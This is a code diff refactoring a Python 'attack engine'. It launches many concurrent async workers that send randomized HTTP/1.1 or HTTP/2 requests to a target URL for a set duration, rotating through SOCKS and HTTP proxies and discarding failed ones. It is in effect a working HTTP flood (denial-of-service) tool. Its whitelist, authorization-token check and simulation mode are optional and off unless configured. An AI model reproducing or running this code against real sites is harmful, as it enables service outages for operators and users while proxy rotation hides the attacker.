@@ -1,49 +1,33 @@
-"""
-Main attack engine with async implementation and HTTP/2 support.
-"""
+"""Main attack engine with async implementation and HTTP/2 support."""
 
 import asyncio
 import time
 import uuid
 from datetime import datetime
 from typing import Optional, Callable
+from collections import deque
 
 import aiohttp
 import httpx
 from aiohttp_socks import ProxyConnector, ProxyType as SocksProxyType
 
-from src.models import (
-    AttackConfig,
-    AttackMode,
-    AttackStats,
-    ProxyType,
-    RequestResult,
-)
+from src.models import AttackConfig, AttackMode, AttackStats, ProxyType, RequestResult
 from src.proxy_manager import ProxyManager
 from src.request_builder import RequestBuilder
 from src.logger import logger
 
+MAX_RESPONSE_SIZE = 10 * 1024 * 1024
+STATS_UPDATE_BATCH = 100
+
 
 class AttackEngine:
-    """Main attack engine using asyncio for high performance."""
+    """High-performance attack engine using asyncio."""
 
-    def __init__(
-        self,
-        config: AttackConfig,
-        proxy_manager: Optional[ProxyManager] = None,
-    ):
-        """
-        Initialize AttackEngine.
-
-        Args:
-            config: Attack configuration.
-            proxy_manager: Optional ProxyManager instance.
-        """
+    def __init__(self, config: AttackConfig, proxy_manager: Optional[ProxyManager] = None):
         self.config = config
         self.proxy_manager = proxy_manager
         self.session_id = str(uuid.uuid4())
 
-        # Statistics
         self.stats = AttackStats(
             session_id=self.session_id,
             target_url=config.target_url,
@@ -51,7 +35,6 @@ class AttackEngine:
             start_time=datetime.now(),
         )
 
-        # Request builder
         self.request_builder = RequestBuilder(
             target_url=config.target_url,
             mode=config.mode,
@@ -60,11 +43,11 @@ class AttackEngine:
             post_data=config.post_data,
         )
 
-        # Control flags
         self._running = False
         self._stop_event = asyncio.Event()
+        self._stats_lock = asyncio.Lock()
+        self._pending_results = deque(maxlen=STATS_UPDATE_BATCH * 2)
 
-        # Callbacks
         self.on_request_complete: Optional[Callable[[RequestResult], None]] = None
         self.on_stats_update: Optional[Callable[[AttackStats], None]] = None
 
@@ -77,23 +60,11 @@ class AttackEngine:
         )
 
     async def start(self) -> AttackStats:
-        """
-        Start the attack with configured parameters.
-
-        Returns:
-            AttackStats with results.
-
-        Raises:
-            RuntimeError: If attack is already running.
-            ValueError: If configuration is invalid.
-        """
         if self._running:
             raise RuntimeError("Attack already running")
 
-        # Validate configuration
         self._validate_config()
 
-        # Check for simulation mode
         if self.config.simulation_mode:
             logger.warning("SIMULATION_MODE_ACTIVE - No real requests will be sent")
             return await self._run_simulation()
@@ -109,11 +80,15 @@ class AttackEngine:
         )
 
         try:
-            # Choose engine based on configuration
+            stats_task = asyncio.create_task(self._batch_stats_updater())
+
             if self.config.use_http2:
                 await self._run_http2_attack()
             else:
                 await self._run_aiohttp_attack()
+
+            stats_task.cancel()
+            await self._flush_pending_stats()
 
         except Exception as e:
             logger.error("attack_failed", error=str(e), exc_info=True)
@@ -140,12 +115,9 @@ class AttackEngine:
         return self.stats
 
     def _validate_config(self) -> None:
-        """Validate attack configuration."""
-        # Check whitelist if enabled
         if self.config.require_authorization and not self.config.authorization_token:
             raise ValueError("Authorization token required but not provided")
 
-        # Validate whitelist
         if self.config.whitelist:
             from urllib.parse import urlparse
             target_domain = urlparse(self.config.target_url).netloc
@@ -155,15 +127,13 @@ class AttackEngine:
                 )
 
     async def _run_simulation(self) -> AttackStats:
-        """Run in simulation mode (no real requests)."""
         logger.info("running_simulation", duration=self.config.duration)
 
         start_time = time.time()
-        simulated_rps = 100  # Simulate 100 req/s
+        simulated_rps = 100
 
         while time.time() - start_time < self.config.duration:
             await asyncio.sleep(0.1)
-            # Simulate stats
             elapsed = time.time() - start_time
             self.stats.total_requests = int(elapsed * simulated_rps)
             self.stats.successful_requests = int(self.stats.total_requests * 0.95)
@@ -178,43 +148,46 @@ class AttackEngine:
         logger.info("simulation_complete", total_requests=self.stats.total_requests)
         return self.stats
 
+    async def _batch_stats_updater(self) -> None:
+        """Background task to batch update stats."""
+        while self._running or len(self._pending_results) > 0:
+            await asyncio.sleep(0.1)
+            if len(self._pending_results) >= STATS_UPDATE_BATCH:
+                await self._flush_pending_stats()
+
+    async def _flush_pending_stats(self) -> None:
+        """Flush all pending results to stats."""
+        if not self._pending_results:
+            return
+
+        async with self._stats_lock:
+            while self._pending_results:
+                result = self._pending_results.popleft()
+                self._update_stats_internal(result)
+
+            if self.on_stats_update:
+                self.on_stats_update(self.stats)
+
     async def _run_aiohttp_attack(self) -> None:
-        """Run attack using aiohttp (HTTP/1.1)."""
         semaphore = asyncio.Semaphore(self.config.threads)
         tasks = []
 
-        # Create worker tasks
         for worker_id in range(self.config.threads):
-            task = asyncio.create_task(
-                self._aiohttp_worker(worker_id, semaphore)
-            )
+            task = asyncio.create_task(self._aiohttp_worker(worker_id, semaphore))
             tasks.append(task)
 
-        # Schedule stop after duration
         asyncio.create_task(self._schedule_stop(self.config.duration))
-
-        # Wait for all workers to complete
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def _aiohttp_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
-        """
-        Worker coroutine for aiohttp-based attacks.
-
-        Args:
-            worker_id: Unique worker identifier.
-            semaphore: Semaphore to limit concurrency.
-        """
         while not self._stop_event.is_set():
             async with semaphore:
-                # Get proxy if available
                 proxy = None
-                proxy_url = None
                 connector = None
 
                 if self.proxy_manager:
                     proxy = self.proxy_manager.get_random_proxy()
                     if proxy:
-                        # Create proxy connector
                         proxy_type_map = {
                             ProxyType.SOCKS4: SocksProxyType.SOCKS4,
                             ProxyType.SOCKS5: SocksProxyType.SOCKS5,
@@ -230,9 +203,7 @@ class AttackEngine:
                         )
 
                 try:
-                    # Create session with connector
                     async with aiohttp.ClientSession(connector=connector) as session:
-                        # Send multiple requests per connection
                         for _ in range(self.config.requests_per_connection):
                             if self._stop_event.is_set():
                                 break
@@ -241,44 +212,34 @@ class AttackEngine:
                                 session, proxy.address if proxy else None
                             )
 
-                            # Update stats
-                            self._update_stats(result)
+                            self._pending_results.append(result)
 
-                            # Callback
                             if self.on_request_complete:
                                 self.on_request_complete(result)
 
-                            # Mark proxy as dead if it failed
                             if not result.success and proxy:
                                 self.proxy_manager.mark_dead(proxy)
-                                break  # Try new proxy
+                                break
 
                 except Exception as e:
-                    logger.debug(f"worker_error", worker_id=worker_id, error=str(e))
+                    logger.debug("worker_error", worker_id=worker_id, error=str(e))
                     if proxy and self.proxy_manager:
                         self.proxy_manager.mark_dead(proxy)
 
     async def _send_aiohttp_request(
         self, session: aiohttp.ClientSession, proxy_address: Optional[str]
     ) -> RequestResult:
-        """Send a single HTTP request using aiohttp."""
         start_time = time.time()
 
         try:
-            # Build request
             kwargs = self.request_builder.build_request_kwargs(randomize=True)
             method = self.request_builder.get_method()
-
-            # Remove URL from kwargs (passed separately)
             url = kwargs.pop("url")
-
-            # Convert timeout to aiohttp format
             timeout = aiohttp.ClientTimeout(total=kwargs.pop("timeout", 10))
 
-            # Send request
             async with session.request(method, url, timeout=timeout, **kwargs) as response:
                 response_time = time.time() - start_time
-                await response.read()  # Consume response
+                await response.content.read(MAX_RESPONSE_SIZE)
 
                 return RequestResult(
                     success=True,
@@ -303,49 +264,40 @@ class AttackEngine:
             )
 
     async def _run_http2_attack(self) -> None:
-        """Run attack using httpx with HTTP/2 support."""
         semaphore = asyncio.Semaphore(self.config.threads)
         tasks = []
 
-        # Create worker tasks
         for worker_id in range(self.config.threads):
-            task = asyncio.create_task(
-                self._http2_worker(worker_id, semaphore)
-            )
+            task = asyncio.create_task(self._http2_worker(worker_id, semaphore))
             tasks.append(task)
 
-        # Schedule stop
         asyncio.create_task(self._schedule_stop(self.config.duration))
-
-        # Wait for completion
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def _http2_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
-        """Worker coroutine for HTTP/2 attacks using httpx."""
         while not self._stop_event.is_set():
             async with semaphore:
-                # Get proxy
                 proxy_url = None
+                proxy = None
+
                 if self.proxy_manager:
                     proxy = self.proxy_manager.get_random_proxy()
                     if proxy:
                         proxy_url = proxy.url
 
                 try:
-                    # Create httpx client with HTTP/2
                     async with httpx.AsyncClient(
                         http2=True,
                         proxy=proxy_url,
                         verify=self.config.verify_ssl,
                         timeout=self.config.timeout,
                     ) as client:
-                        # Send requests
                         for _ in range(self.config.requests_per_connection):
                             if self._stop_event.is_set():
                                 break
 
                             result = await self._send_http2_request(client, proxy_url)
-                            self._update_stats(result)
+                            self._pending_results.append(result)
 
                             if self.on_request_complete:
                                 self.on_request_complete(result)
@@ -356,19 +308,20 @@ class AttackEngine:
 
                 except Exception as e:
                     logger.debug("http2_worker_error", worker_id=worker_id, error=str(e))
+                    if proxy and self.proxy_manager:
+                        self.proxy_manager.mark_dead(proxy)
 
     async def _send_http2_request(
         self, client: httpx.AsyncClient, proxy_url: Optional[str]
     ) -> RequestResult:
-        """Send HTTP/2 request using httpx."""
         start_time = time.time()
 
         try:
             kwargs = self.request_builder.build_request_kwargs(randomize=True)
             method = self.request_builder.get_method()
             url = kwargs.pop("url")
-            kwargs.pop("timeout", None)  # Already set in client
-            kwargs.pop("allow_redirects", None)  # Use follow_redirects in httpx
+            kwargs.pop("timeout", None)
+            kwargs.pop("allow_redirects", None)
 
             response = await client.request(method, url, follow_redirects=False, **kwargs)
             response_time = time.time() - start_time
@@ -395,8 +348,8 @@ class AttackEngine:
                 proxy_used=proxy_url,
             )
 
-    def _update_stats(self, result: RequestResult) -> None:
-        """Update statistics with request result."""
+    def _update_stats_internal(self, result: RequestResult) -> None:
+        """Internal stats update without lock (must be called within lock)."""
         self.stats.total_requests += 1
 
         if result.success:
@@ -408,7 +361,6 @@ class AttackEngine:
         else:
             self.stats.failed_requests += 1
 
-        # Update response time stats
         if result.response_time > 0:
             if self.stats.min_response_time == 0:
                 self.stats.min_response_time = result.response_time
@@ -421,24 +373,20 @@ class AttackEngine:
                 self.stats.max_response_time, result.response_time
             )
 
-            # Update average (incremental)
             total_time = self.stats.avg_response_time * (self.stats.total_requests - 1)
             self.stats.avg_response_time = (
                 total_time + result.response_time
             ) / self.stats.total_requests
 
     async def _schedule_stop(self, duration: int) -> None:
-        """Schedule attack to stop after duration."""
         await asyncio.sleep(duration)
         logger.info("duration_reached_stopping", duration=duration)
         self._stop_event.set()
 
     async def stop(self) -> None:
-        """Stop the attack gracefully."""
         logger.info("stopping_attack", session_id=self.session_id)
         self._stop_event.set()
-        await asyncio.sleep(0.1)  # Allow workers to finish current requests
+        await asyncio.sleep(0.1)
 
     def get_stats(self) -> AttackStats:
-        """Get current statistics."""
         return self.stats
